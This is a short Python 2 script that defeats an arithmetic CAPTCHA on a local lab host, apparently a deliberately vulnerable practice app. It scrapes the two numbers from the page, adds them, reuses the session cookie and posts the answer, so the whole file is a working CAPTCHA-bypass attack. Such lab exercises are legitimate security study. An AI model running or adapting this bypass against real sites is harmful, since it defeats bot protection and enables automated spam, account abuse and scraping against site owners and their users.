import requests
import re
get_url="http://192.168.75.134/Captch-Bypass-Vulnerable-Script-master/ArithmeticCAPTCHA/captchaarith.php"
post_url="http://192.168.75.134/Captch-Bypass-Vulnerable-Script-master/ArithmeticCAPTCHA/captchaarithvalidate.php"
request_url=requests.get(get_url)
#print request_url.headers
get_cookie=request_url.headers['set-cookie']
array_url=re.findall('[0-9]{2}',request_url.content)
print 'The first num is: '+str(array_url[0])
print 'The second num is: '+str(array_url[1])
print 'The answer to CAPTCH is: '+str(int(array_url[0])+int(array_url[1]))
captcha=int(array_url[0])+int(array_url[1])
headers={
    'Cookie':get_cookie
}
data={
    'captcha':captcha,
    'submit':'Submit'
}
print 'We are making the HTTP request to crack the CAPTCHA....'
print '-------------------------------------------------------'
print data
print '-------------------------------------------------------'
response_url=requests.post(url=post_url,headers=headers,data=data)
print 'The response is....'
print '-------------------------------------------------------'
print response_url.content
print '-------------------------------------------------------'